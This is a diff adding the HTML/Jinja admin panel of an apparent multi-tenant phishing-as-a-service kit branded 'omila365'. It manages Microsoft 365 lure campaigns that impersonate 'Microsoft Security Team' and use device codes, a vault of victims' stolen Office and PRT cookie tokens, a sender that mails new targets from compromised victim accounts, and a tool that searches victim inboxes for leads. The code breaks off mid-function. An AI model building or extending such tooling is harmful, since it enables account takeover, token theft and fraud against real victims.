@@ -1,0 +1,843 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>omila365 – Admin Panel</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css" rel="stylesheet">
+    <style>
+        /* ===== DARK THEME ===== */
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { background:#0a0e17; color:#d7dee8; font-family:'Inter','Segoe UI',sans-serif; display:flex; height:100vh; overflow:hidden; }
+        .sidebar {
+            width:240px;
+            background:#0d1117;
+            border-right:1px solid #1a2a3a;
+            padding:20px 0;
+            display:flex;
+            flex-direction:column;
+            flex-shrink:0;
+            height:100vh;
+            overflow-y:auto;
+        }
+        .sidebar .brand { text-align:center; padding:0 15px 20px; border-bottom:1px solid #1a2a3a; }
+        .sidebar .brand h4 { color:#00ff41; text-shadow:0 0 20px #00ff41; font-weight:700; font-size:1.2rem; letter-spacing:1px; }
+        .sidebar .brand small { color:#556677; font-size:0.65rem; letter-spacing:2px; text-transform:uppercase; }
+        .sidebar .nav-section { padding:0 12px; margin-bottom:8px; }
+        .sidebar .nav-section .section-title { color:#556677; font-size:0.6rem; text-transform:uppercase; letter-spacing:2px; padding:10px 0 4px 10px; border-bottom:1px solid #1a2a3a; margin-bottom:4px; }
+        .sidebar .nav-item { display:flex; align-items:center; padding:7px 12px; color:#8899aa; text-decoration:none; border-radius:6px; font-size:0.8rem; transition:all 0.2s; cursor:pointer; }
+        .sidebar .nav-item:hover { background:#1a2332; color:#00ff41; }
+        .sidebar .nav-item.active { background:#1a2332; color:#00ff41; border-left:3px solid #00ff41; }
+        .sidebar .nav-item i { width:20px; margin-right:10px; font-size:0.9rem; }
+        .sidebar .user-section { margin-top:auto; padding:15px; border-top:1px solid #1a2a3a; }
+        .sidebar .user-section .user-name { color:#00ff41; font-weight:600; font-size:0.85rem; }
+        .sidebar .user-section .user-links a { display:block; color:#556677; font-size:0.7rem; padding:3px 0; text-decoration:none; transition:color 0.2s; }
+        .sidebar .user-section .user-links a:hover { color:#00ff41; }
+        .sidebar .user-section .logout { color:#ff0044; font-weight:600; margin-top:5px; padding:8px 12px; border-radius:6px; background:rgba(255,0,68,0.05); text-align:center; text-decoration:none; display:block; transition:background 0.2s; }
+        .sidebar .user-section .logout:hover { background:rgba(255,0,68,0.15); }
+        .main-content { flex:1; padding:20px 30px; overflow-y:auto; height:100vh; }
+        .page-title { color:#f3f6fa; font-size:1.3rem; font-weight:700; border-bottom:1px solid #1a2a3a; padding-bottom:10px; margin-bottom:20px; display:flex; justify-content:space-between; align-items:center; }
+        .page-title small { color:#7f8b99; font-size:0.7rem; font-weight:normal; }
+        .card { background:#111927; border:1px solid #1a2a3a; border-radius:8px; margin-bottom:15px; }
+        .card-header { background:#1a2332; border-bottom:1px solid #1a2a3a; color:#00ff41; font-weight:600; padding:10px 15px; display:flex; justify-content:space-between; align-items:center; }
+        .card-body { padding:15px; }
+        .stat-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(150px,1fr)); gap:12px; margin-bottom:20px; }
+        .stat-card { background:#0d1520; border:1px solid #1a2a3a; border-radius:8px; padding:15px; text-align:center; }
+        .stat-number { font-size:1.8rem; font-weight:700; color:#00ff41; }
+        .stat-label { color:#8899aa; font-size:0.65rem; text-transform:uppercase; letter-spacing:1px; }
+        .form-control, .form-select { background:#0d1520 !important; border:1px solid #1a2a3a !important; color:#d7dee8 !important; }
+        .form-control:focus, .form-select:focus { border-color:#00ff41 !important; box-shadow:0 0 20px rgba(0,255,65,0.1) !important; }
+        .btn-success { background:#00ff41; border:none; color:#0a0e17; font-weight:600; }
+        .btn-success:hover { background:#00cc33; }
+        .btn-danger { background:#ff0044; border:none; color:#fff; font-weight:600; }
+        .btn-danger:hover { background:#cc0033; }
+        .btn-warning { background:#ffaa00; border:none; color:#0a0e17; font-weight:600; }
+        .btn-warning:hover { background:#cc8800; }
+        .btn-info { background:#00aaff; border:none; color:#0a0e17; font-weight:600; }
+        .btn-info:hover { background:#0088cc; }
+        .btn-sm { padding:4px 10px; font-size:0.7rem; }
+        .table { color:#d7dee8; }
+        .table thead th { border-bottom:1px solid #1a2a3a; color:#8899aa; text-transform:uppercase; font-size:0.6rem; letter-spacing:1px; }
+        .table td { border-bottom:1px solid #0d1520; vertical-align:middle; }
+        .alert { background:#0d1520; border:1px solid #1a2a3a; color:#d7dee8; }
+        .alert-success { border-color:#00ff41; color:#00ff41; }
+        .alert-warning { border-color:#ffaa00; color:#ffaa00; }
+        .alert-danger { border-color:#ff0044; color:#ff0044; }
+        .alert-info { border-color:#00aaff; color:#00aaff; }
+        .alert-secondary { border-color:#2b3645; color:#b8c2cf; }
+        ::-webkit-scrollbar { width:5px; }
+        ::-webkit-scrollbar-track { background:#0a0e17; }
+        ::-webkit-scrollbar-thumb { background:#00ff41; border-radius:3px; }
+        .badge-admin { background:#00aaff; color:#0a0e17; }
+        .badge-operator { background:#ffaa00; color:#0a0e17; }
+        .badge-user { background:#556677; color:#fff; }
+        .badge-active { background:#00ff41; color:#0a0e17; }
+        .badge-inactive { background:#ff0044; color:#fff; }
+        .badge-trial { background:#556677; color:#fff; }
+        .modal-content { background:#111927; border:1px solid #1a2a3a; }
+        .modal-header { border-bottom:1px solid #1a2a3a; }
+        .modal-footer { border-top:1px solid #1a2a3a; }
+        .btn-close { filter:invert(1); }
+        .text-muted { color:#7f8b99 !important; }
+        .card-body p, .card-body strong { color:#d7dee8; }
+        .card-body, .card-body p, .card-body li, .card-body .badge, .card-body strong, .card-body span { color:#d7dee8 !important; }
+        .card-body .text-muted, .card-body small { color:#8899aa !important; }
+        .card-body .badge.bg-secondary { color:#fff !important; }
+    </style>
+</head>
+<body>
+
+<!-- SIDEBAR -->
+<div class="sidebar">
+    <div class="brand">
+        <h4>☠️ omila365</h4>
+        <small>ADMIN PANEL</small>
+    </div>
+    <div class="nav-section">
+        <div class="section-title">OVERVIEW</div>
+        <a href="#dashboard" class="nav-item active" onclick="showPage('dashboard')"><i class="bi bi-speedometer2"></i> Dashboard</a>
+        <a href="#users" class="nav-item" onclick="showPage('users')"><i class="bi bi-people"></i> Users</a>
+        <a href="#tenants" class="nav-item" onclick="showPage('tenants')"><i class="bi bi-building"></i> Tenants</a>
+    </div>
+    <div class="nav-section">
+        <div class="section-title">LURES</div>
+        <a href="#lures" class="nav-item" onclick="showPage('lures')"><i class="bi bi-folder-open"></i> Lures</a>
+        <a href="#inbox" class="nav-item" onclick="showPage('inbox')"><i class="bi bi-inbox"></i> Inbox</a>
+    </div>
+    <div class="nav-section">
+        <div class="section-title">TOOLS</div>
+        <a href="#b2b" class="nav-item" onclick="showPage('b2b')"><i class="bi bi-envelope-paper"></i> B2B Sender</a>
+        <a href="#extractor" class="nav-item" onclick="showPage('extractor')"><i class="bi bi-search"></i> Email Extractor</a>
+        <a href="#tokens" class="nav-item" onclick="showPage('tokens')"><i class="bi bi-key"></i> Token Vault</a>
+    </div>
+    <div class="nav-section">
+        <div class="section-title">SETTINGS</div>
+        <a href="#settings" class="nav-item" onclick="showPage('settings')"><i class="bi bi-gear"></i> Global Settings</a>
+        <a href="#telegram" class="nav-item" onclick="showPage('telegram')"><i class="bi bi-telegram"></i> Telegram</a>
+        <a href="#ai" class="nav-item" onclick="showPage('ai')"><i class="bi bi-robot"></i> AI Intelligence</a>
+    </div>
+    <div class="nav-section">
+        <div class="section-title">SYSTEM</div>
+        <a href="#vps" class="nav-item" onclick="showPage('vps')"><i class="bi bi-server"></i> VPS Connection</a>
+        <a href="{{ url_for('auth.logout') }}" class="nav-item"><i class="bi bi-box-arrow-right"></i> Logout</a>
+    </div>
+    <div class="user-section">
+        <div class="user-name">@{{ current_user.username }}</div>
+        <div class="user-links">
+            <a href="#" onclick="alert('📋 Report Issue')">📋 Report Issue</a>
+            <a href="#" onclick="alert('📢 Join Channel')">📢 Join Channel</a>
+            <a href="{{ url_for('operator.dashboard') }}" class="nav-item" style="padding:4px 0; font-size:0.7rem; color:#556677;">← Back to Operator</a>
+        </div>
+    </div>
+</div>
+
+<!-- MAIN CONTENT -->
+<div class="main-content" id="mainContent">
+
+    <!-- ===== DASHBOARD ===== -->
+    <div id="page-dashboard" class="page-content">
+        <div class="page-title"><span><i class="bi bi-speedometer2"></i> Admin Dashboard <small>Full system control</small></span></div>
+        {% with messages = get_flashed_messages(with_categories=true) %}
+            {% for category, message in messages %}
+                <div class="alert alert-{{ category }} alert-dismissible fade show">{{ message }}</div>
+            {% endfor %}
+        {% endwith %}
+        <div class="stat-grid">
+            <div class="stat-card"><div class="stat-number">{{ total_users }}</div><div class="stat-label">Total Users</div></div>
+            <div class="stat-card"><div class="stat-number">{{ total_tenants }}</div><div class="stat-label">Tenants</div></div>
+            <div class="stat-card"><div class="stat-number">{{ total_campaigns }}</div><div class="stat-label">Campaigns</div></div>
+            <div class="stat-card"><div class="stat-number">{{ total_tokens }}</div><div class="stat-label">Tokens</div></div>
+        </div>
+        <div class="stat-grid" style="grid-template-columns: repeat(3,1fr);">
+            <div class="stat-card"><div class="stat-number">{{ total_harvested }}</div><div class="stat-label">Harvested</div></div>
+            <div class="stat-card"><div class="stat-number">{{ total_leads }}</div><div class="stat-label">Leads</div></div>
+            <div class="stat-card"><div class="stat-number">{{ total_drafts }}</div><div class="stat-label">Drafts</div></div>
+        </div>
+        <div class="card">
+            <div class="card-header">Tenant Stats</div>
+            <div class="card-body">
+                <div class="table-responsive">
+                    <table class="table table-sm">
+                        <thead><tr><th>Tenant</th><th>Users</th><th>Campaigns</th><th>Victims</th><th>Tokens</th><th>Harvested</th><th>Leads</th><th>Drafts</th><th>Actions</th></tr></thead>
+                        <tbody>
+                            {% for stat in tenant_stats %}
+                            <tr>
+                                <td>{{ stat.tenant.name }}</td>
+                                <td>{{ stat.user_count }}</td>
+                                <td>{{ stat.campaign_count }}</td>
+                                <td>{{ stat.victim_count }}</td>
+                                <td>{{ stat.token_count }}</td>
+                                <td>{{ stat.harvested_count }}</td>
+                                <td>{{ stat.lead_count }}</td>
+                                <td>{{ stat.draft_count }}</td>
+                                <td><button class="btn btn-sm btn-info" onclick="openTenantSettings({{ stat.tenant.id }}, '{{ stat.tenant.name }}')">⚙️</button></td>
+                            </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== USERS ===== -->
+    <div id="page-users" class="page-content" style="display:none;">
+        <div class="page-title"><span><i class="bi bi-people"></i> User Management</span></div>
+        <div class="card">
+            <div class="card-body">
+                <div class="table-responsive">
+                    <table class="table table-hover table-sm">
+                        <thead><tr><th>ID</th><th>Username</th><th>Email</th><th>Tenant</th><th>Role</th><th>Balance</th><th>Expiry</th><th>Status</th><th>Actions</th></tr></thead>
+                        <tbody>
+                            {% for user in all_users %}
+                            <tr>
+                                <td>{{ user.id }}</td>
+                                <td>{{ user.username }}</td>
+                                <td>{{ user.email or 'N/A' }}</td>
+                                <td>{{ user.tenant.name if user.tenant else 'Global' }}</td>
+                                <td><span class="badge badge-{{ user.role }}">{{ user.role }}</span></td>
+                                <td>${{ "%.2f"|format(user.balance) }}</td>
+                                <td>{{ user.expiry_date.strftime('%Y-%m-%d') if user.expiry_date else 'N/A' }}</td>
+                                <td><span class="badge badge-{{ 'active' if user.is_active else 'inactive' }}">{{ 'Active' if user.is_active else 'Inactive' }}</span></td>
+                                <td>
+                                    <button class="btn btn-sm btn-outline-primary" onclick="toggleUser({{ user.id }})">Toggle</button>
+                                    <button class="btn btn-sm btn-danger" onclick="deleteUser({{ user.id }})">Delete</button>
+                                    <button class="btn btn-sm btn-info" onclick="openRoleModal({{ user.id }}, '{{ user.role }}')">Role</button>
+                                    <button class="btn btn-sm btn-warning" onclick="openExpiryModal({{ user.id }})">Expiry</button>
+                                    <button class="btn btn-sm btn-success" onclick="openBalanceModal({{ user.id }}, {{ user.balance }})">💰</button>
+                                </td>
+                            </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== TENANTS ===== -->
+    <div id="page-tenants" class="page-content" style="display:none;">
+        <div class="page-title"><span><i class="bi bi-building"></i> Tenants</span></div>
+        <div class="card">
+            <div class="card-body">
+                <div class="table-responsive">
+                    <table class="table table-sm">
+                        <thead><tr><th>ID</th><th>Name</th><th>Plan</th><th>Active</th><th>Users</th><th>Campaigns</th><th>Actions</th></tr></thead>
+                        <tbody>
+                            {% for stat in tenant_stats %}
+                            <tr>
+                                <td>{{ stat.tenant.id }}</td>
+                                <td>{{ stat.tenant.name }}</td>
+                                <td>{{ stat.tenant.plan or 'Trial' }}</td>
+                                <td><span class="badge badge-{{ 'active' if stat.tenant.is_active else 'inactive' }}">{{ 'Active' if stat.tenant.is_active else 'Inactive' }}</span></td>
+                                <td>{{ stat.user_count }}</td>
+                                <td>{{ stat.campaign_count }}</td>
+                                <td>
+                                    <button class="btn btn-sm btn-outline-primary" onclick="toggleTenant({{ stat.tenant.id }})">Toggle</button>
+                                    <button class="btn btn-sm btn-danger" onclick="deleteTenant({{ stat.tenant.id }})">Delete</button>
+                                    <button class="btn btn-sm btn-info" onclick="openPlanModal({{ stat.tenant.id }}, '{{ stat.tenant.plan or 'Trial' }}')">Plan</button>
+                                    <button class="btn btn-sm btn-success" onclick="openTenantSettings({{ stat.tenant.id }}, '{{ stat.tenant.name }}')">⚙️</button>
+                                </td>
+                            </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== LURES (God mode) ===== -->
+    <div id="page-lures" class="page-content" style="display:none;">
+        <div class="page-title"><span><i class="bi bi-folder-open"></i> Lures <small>Create and manage campaigns for any tenant</small></span></div>
+        <div class="card">
+            <div class="card-header">Create New Lure</div>
+            <div class="card-body">
+                <form method="POST" action="{{ url_for('admin.create_campaign') }}">
+                    <div class="row g-2">
+                        <div class="col-md-4">
+                            <label>Lure Name</label>
+                            <input type="text" name="name" class="form-control" placeholder="e.g. Q1 Report">
+                        </div>
+                        <div class="col-md-3">
+                            <label>Template</label>
+                            <select name="template_id" class="form-control">
+                                {% for t in templates %}
+                                <option value="{{ t.id }}">{{ t.name }}</option>
+                                {% endfor %}
+                            </select>
+                        </div>
+                        <div class="col-md-2">
+                            <label>Tenant</label>
+                            <select name="tenant_id" class="form-control" required>
+                                {% for stat in tenant_stats %}
+                                <option value="{{ stat.tenant.id }}">{{ stat.tenant.name }}</option>
+                                {% endfor %}
+                            </select>
+                        </div>
+                        <div class="col-md-3">
+                            <label>&nbsp;</label>
+                            <button type="submit" class="btn btn-success w-100">🧪 Create Lure</button>
+                        </div>
+                    </div>
+                    <div class="row g-2 mt-2">
+                        <div class="col-md-3"><label>Sender Name</label><input type="text" name="sender_name" class="form-control" placeholder="Microsoft Security Team"></div>
+                        <div class="col-md-3"><label>Document Title</label><input type="text" name="document_title" class="form-control" placeholder="Security Alert"></div>
+                        <div class="col-md-2"><label>Document Type</label><select name="document_type" class="form-control"><option>.PDF</option><option>.DOCX</option><option>.XLSX</option><option>.PPTX</option><option>.CSV</option><option>.ZIP</option></select></div>
+                        <div class="col-md-2"><label>Language</label><select name="language" class="form-control"><option>English</option><option>Spanish</option><option>French</option></select></div>
+                        <div class="col-md-2"><label>Token Type</label><select name="token_type" class="form-control"><option>B2B (Office)</option><option>Cookie (PRT)</option></select></div>
+                    </div>
+                    <div class="row g-2 mt-2">
+                        <div class="col-md-6"><label>Exit URL</label><input type="url" name="exit_url" class="form-control" placeholder="https://www.microsoft.com" value="https://www.microsoft.com"></div>
+                    </div>
+                </form>
+            </div>
+        </div>
+        <div class="card">
+            <div class="card-header">All Campaigns</div>
+            <div class="card-body">
+                <div class="table-responsive">
+                    <table class="table table-sm">
+                        <thead><tr><th>ID</th><th>Name</th><th>Tenant</th><th>Status</th><th>Created</th><th>Actions</th></tr></thead>
+                        <tbody>
+                            {% for c in campaigns %}
+                            <tr>
+                                <td>{{ c.id }}</td>
+                                <td>{{ c.name }}</td>
+                                <td>{{ c.tenant.name if c.tenant else '—' }}</td>
+                                <td><span class="badge badge-{{ 'active' if c.status == 'active' else 'inactive' }}">{{ c.status }}</span></td>
+                                <td>{{ c.created_at.strftime('%Y-%m-%d') }}</td>
+                                <td>
+                                    <button class="btn btn-sm btn-outline-primary" onclick="toggleCampaign({{ c.id }})">Toggle</button>
+                                    <button class="btn btn-sm btn-danger" onclick="deleteCampaign({{ c.id }})">Delete</button>
+                                    <button class="btn btn-sm btn-info" onclick="showDeviceCodes({{ c.id }})">Codes</button>
+                                    <button class="btn btn-sm btn-success" onclick="processCampaign({{ c.id }})">Process</button>
+                                    <button class="btn btn-sm btn-warning" onclick="getLeads({{ c.id }})">Leads</button>
+                                </td>
+                            </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== INBOX (placeholder) ===== -->
+    <div id="page-inbox" class="page-content" style="display:none;">
+        <div class="page-title"><span><i class="bi bi-inbox"></i> Inbox</span></div>
+        <div class="card"><div class="card-body"><div class="alert alert-secondary">Coming soon: aggregated inbox view across all victims.</div></div></div>
+    </div>
+
+    <!-- ===== B2B SENDER ===== -->
+    <div id="page-b2b" class="page-content" style="display:none;">
+        <div class="page-title"><span><i class="bi bi-envelope-paper"></i> B2B Sender</span></div>
+        <div class="card">
+            <div class="card-body">
+                <form id="b2bForm">
+                    <div class="mb-2"><label>Victim (with token)</label><select id="b2bVictim" class="form-control">
+                        {% for v in victims %}
+                        <option value="{{ v.id }}">{{ v.email or 'Victim '~v.id }} ({{ v.campaign.name }})</option>
+                        {% endfor %}
+                    </select></div>
+                    <div class="mb-2"><label>Recipients (one per line)</label><textarea id="b2bRecipients" class="form-control" rows="3" placeholder="target1@example.com"></textarea></div>
+                    <div class="mb-2"><label>Subject</label><input type="text" id="b2bSubject" class="form-control" placeholder="RE: Important"></div>
+                    <div class="mb-2"><label>Body (HTML)</label><textarea id="b2bBody" class="form-control" rows="5" placeholder="Write email..."></textarea></div>
+                    <button type="submit" class="btn btn-danger">📤 Send</button>
+                </form>
+                <div id="b2bResult" class="mt-2"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== EXTRACTOR ===== -->
+    <div id="page-extractor" class="page-content" style="display:none;">
+        <div class="page-title"><span><i class="bi bi-search"></i> Email Extractor</span></div>
+        <div class="card">
+            <div class="card-body">
+                <form method="POST" action="{{ url_for('admin.admin_extract') }}">
+                    <div class="row">
+                        <div class="col-md-6"><input type="text" name="keyword" class="form-control" placeholder="Keyword to search in victim emails" required></div>
+                        <div class="col-md-3"><button type="submit" class="btn btn-success w-100">🚀 Extract</button></div>
+                        <div class="col-md-3"><a href="{{ url_for('admin.sort_leads') }}" class="btn btn-warning w-100">📊 Sort</a></div>
+                    </div>
+                </form>
+                <div class="mt-2"><a href="{{ url_for('admin.verify_leads') }}" class="btn btn-info">✅ Verify Leads</a></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== TOKEN VAULT ===== -->
+    <div id="page-tokens" class="page-content" style="display:none;">
+        <div class="page-title"><span><i class="bi bi-key"></i> Token Vault</span></div>
+        <div class="card">
+            <div class="card-body">
+                <div class="table-responsive">
+                    <table class="table table-sm">
+                        <thead><tr><th>ID</th><th>Email</th><th>Campaign</th><th>Status</th><th>Token</th><th>Actions</th></tr></thead>
+                        <tbody>
+                            {% for v in victims %}
+                            <tr>
+                                <td>{{ v.id }}</td>
+                                <td>{{ v.email or 'Unknown' }}</td>
+                                <td>{{ v.campaign.name if v.campaign else '—' }}</td>
+                                <td><span class="badge badge-{{ 'active' if v.status == 'completed' else 'inactive' }}">{{ v.status }}</span></td>
+                                <td>{% if v.access_token %}<span class="text-success">✅</span>{% else %}<span class="text-danger">❌</span>{% endif %}</td>
+                                <td>
+                                    <button class="btn btn-sm btn-danger" onclick="deleteVictim({{ v.id }})">Delete</button>
+                                </td>
+                            </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== SETTINGS ===== -->
+    <div id="page-settings" class="page-content" style="display:none;">
+        <div class="page-title"><span><i class="bi bi-gear"></i> Global Settings</span></div>
+        <div class="card">
+            <div class="card-body">
+                <form method="POST" action="{{ url_for('admin.update_ai_settings') }}">
+                    <div class="mb-3"><label>SMTP Server</label><input type="text" name="smtp_server" class="form-control" placeholder="smtp.gmail.com"></div>
+                    <div class="mb-3"><label>SMTP Port</label><input type="number" name="smtp_port" class="form-control" value="587"></div>
+                    <div class="mb-3"><label>SMTP Username</label><input type="text" name="smtp_username" class="form-control" placeholder="user@example.com"></div>
+                    <div class="mb-3"><label>SMTP Password</label><input type="password" name="smtp_password" class="form-control" placeholder="****"></div>
+                    <div class="mb-3"><label>From Email</label><input type="email" name="smtp_from" class="form-control" placeholder="noreply@example.com"></div>
+                    <button type="submit" class="btn btn-success">Save Global Settings</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== TELEGRAM ===== -->
+    <div id="page-telegram" class="page-content" style="display:none;">
+        <div class="page-title"><span><i class="bi bi-telegram"></i> Telegram Notifications</span></div>
+        <div class="card">
+            <div class="card-body">
+                <form method="POST" action="{{ url_for('admin.update_telegram') }}">
+                    <div class="mb-3"><label>Bot Token</label><input type="text" name="bot_token" class="form-control" placeholder="123456:ABC..."></div>
+                    <div class="mb-3"><label>Chat ID</label><input type="text" name="chat_id" class="form-control" placeholder="-123456789"></div>
+                    <button type="submit" class="btn btn-success">Save Telegram Settings</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== AI ===== -->
+    <div id="page-ai" class="page-content" style="display:none;">
+        <div class="page-title"><span><i class="bi bi-robot"></i> AI Intelligence</span></div>
+        <div class="card">
+            <div class="card-body">
+                <form method="POST" action="{{ url_for('admin.update_ai_settings') }}">
+                    <div class="mb-3"><label>Provider</label><select name="ai_provider" class="form-control"><option>DeepSeek</option><option>OpenAI</option><option>Groq</option><option>Anthropic</option></select></div>
+                    <div class="mb-3"><label>API Key</label><input type="password" name="ai_api_key" class="form-control" placeholder="sk-..."></div>
+                    <div class="mb-3"><label>Model</label><input type="text" name="ai_model" class="form-control" placeholder="deepseek-chat"></div>
+                    <button type="submit" class="btn btn-success">Save AI Settings</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== VPS ===== -->
+    <div id="page-vps" class="page-content" style="display:none;">
+        <div class="page-title"><span><i class="bi bi-server"></i> VPS Connection</span></div>
+        <div class="card">
+            <div class="card-body">
+                <form method="POST" action="{{ url_for('admin.update_tenant_vps', tenant_id=1) }}">
+                    <div class="mb-3"><label>IP Address</label><input type="text" name="vps_ip" class="form-control" placeholder="192.168.1.1"></div>
+                    <div class="mb-3"><label>Port</label><input type="number" name="vps_port" class="form-control" value="22"></div>
+                    <div class="mb-3"><label>Username</label><input type="text" name="vps_username" class="form-control" placeholder="root"></div>
+                    <div class="mb-3"><label>Password / SSH Key</label><textarea name="vps_credentials" class="form-control" rows="3" placeholder="Password or SSH private key"></textarea></div>
+                    <button type="submit" class="btn btn-success">Test & Save VPS</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+</div>
+
+<!-- ===== MODALS ===== -->
+<!-- Role Modal -->
+<div class="modal fade" id="roleModal" tabindex="-1" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content bg-dark text-light">
+            <div class="modal-header border-secondary"><h5 class="modal-title">Change Role</h5><button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button></div>
+            <div class="modal-body"><select id="roleSelect" class="form-control"><option value="admin">Admin</option><option value="operator">Operator</option><option value="user">User</option></select></div>
+            <div class="modal-footer border-secondary"><button class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button class="btn btn-success" onclick="saveRole()">Save</button></div>
+        </div>
+    </div>
+</div>
+<!-- Expiry Modal -->
+<div class="modal fade" id="expiryModal" tabindex="-1" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content bg-dark text-light">
+            <div class="modal-header border-secondary"><h5 class="modal-title">Set Expiry (days)</h5><button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button></div>
+            <div class="modal-body"><input type="number" id="expiryDays" class="form-control" placeholder="0 = never" value="30"></div>
+            <div class="modal-footer border-secondary"><button class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button class="btn btn-success" onclick="saveExpiry()">Save</button></div>
+        </div>
+    </div>
+</div>
+<!-- Balance Modal -->
+<div class="modal fade" id="balanceModal" tabindex="-1" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content bg-dark text-light">
+            <div class="modal-header border-secondary"><h5 class="modal-title">Manage Balance</h5><button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button></div>
+            <div class="modal-body">
+                <p>Current Balance: <strong id="currentBalanceDisplay">$0.00</strong></p>
+                <input type="number" id="balanceAmount" class="form-control" step="0.01" value="10">
+                <div class="mt-2">
+                    <button class="btn btn-success" onclick="balanceAction('add')">Add</button>
+                    <button class="btn btn-danger" onclick="balanceAction('subtract')">Subtract</button>
+                    <button class="btn btn-primary" onclick="balanceAction('set')">Set</button>
+                </div>
+            </div>
+            <div class="modal-footer border-secondary"><button class="btn btn-secondary" data-bs-dismiss="modal">Close</button></div>
+        </div>
+    </div>
+</div>
+<!-- Plan Modal -->
+<div class="modal fade" id="planModal" tabindex="-1" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content bg-dark text-light">
+            <div class="modal-header border-secondary"><h5 class="modal-title">Update Tenant Plan</h5><button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button></div>
+            <div class="modal-body"><select id="planSelect" class="form-control"><option value="Trial">Trial</option><option value="Basic">Basic</option><option value="Premium">Premium</option></select></div>
+            <div class="modal-footer border-secondary"><button class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button class="btn btn-success" onclick="savePlan()">Save</button></div>
+        </div>
+    </div>
+</div>
+<!-- Tenant Settings Modal -->
+<div class="modal fade" id="tenantSettingsModal" tabindex="-1" aria-hidden="true">
+    <div class="modal-dialog modal-lg modal-dialog-centered">
+        <div class="modal-content bg-dark text-light">
+            <div class="modal-header border-secondary"><h5 class="modal-title">Tenant Settings: <span id="tenantSettingsName"></span></h5><button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button></div>
+            <div class="modal-body">
+                <h6 class="text-success">Telegram</h6>
+                <form id="tenantTelegramForm">
+                    <input type="hidden" id="telegramTenantId">
+                    <div class="mb-2"><label>Bot Token</label><input type="text" name="bot_token" id="telegramBotToken" class="form-control" placeholder="123456:ABC..."></div>
+                    <div class="mb-2"><label>Chat ID</label><input type="text" name="chat_id" id="telegramChatId" class="form-control" placeholder="-123456789"></div>
+                    <button type="submit" class="btn btn-success btn-sm">Save Telegram</button>
+                </form>
+                <hr>
+                <h6 class="text-success">VPS</h6>
+                <form id="tenantVpsForm">
+                    <input type="hidden" id="vpsTenantId">
+                    <div class="row g-2">
+                        <div class="col-md-4"><label>IP</label><input type="text" name="vps_ip" class="form-control" placeholder="192.168.1.1"></div>
+                        <div class="col-md-2"><label>Port</label><input type="number" name="vps_port" class="form-control" value="22"></div>
+                        <div class="col-md-3"><label>Username</label><input type="text" name="vps_username" class="form-control" placeholder="root"></div>
+                        <div class="col-md-3"><label>Auth Method</label><select name="vps_auth_method" class="form-control"><option>password</option><option>key</option></select></div>
+                    </div>
+                    <div class="mt-2"><label>Password / SSH Key</label><textarea name="vps_credentials" class="form-control" rows="2" placeholder="Password or private key"></textarea></div>
+                    <button type="submit" class="btn btn-success btn-sm mt-2">Save VPS</button>
+                </form>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ===== JAVASCRIPT ===== -->
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+    // Navigation
+    function showPage(page) {
+        document.querySelectorAll('.page-content').forEach(el => el.style.display = 'none');
+        document.getElementById('page-' + page).style.display = 'block';
+        document.querySelectorAll('.sidebar .nav-item').forEach(el => el.classList.remove('active'));
+        document.querySelector(`.sidebar .nav-item[href="#${page}"]`)?.classList.add('active');
+    }
+    document.addEventListener('DOMContentLoaded', () => showPage('dashboard'));
+
+    // User actions
+    let currentUserId = null;
+    
+    function toggleUser(id) {
+        if (!confirm('Toggle user status?')) return;
+        fetch('/admin/user/' + id + '/toggle', { method: 'POST' })
+            .then(r => r.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    location.reload();
+                } else {
+                    alert('Error: ' + (data.error || 'Unknown error'));
+                }
+            })
+            .catch(err => alert('Error: ' + err));
+    }
+    
+    function deleteUser(id) {
+        if (!confirm('Delete this user? This action cannot be undone.')) return;
+        fetch('/admin/user/' + id + '/delete', { method: 'POST' })
+            .then(r => r.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    alert('User deleted successfully.');
+                    location.reload();
+                } else {
+                    alert('Error: ' + (data.error || 'Unknown error'));
+                }
+            })
+            .catch(err => alert('Error: ' + err));
+    }
+    
+    function openRoleModal(id, role) {
+        currentUserId = id;
+        document.getElementById('roleSelect').value = role;
+        new bootstrap.Modal(document.getElementById('roleModal')).show();
+    }
+    function saveRole() {
+        fetch('/admin/user/' + currentUserId + '/set_role', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
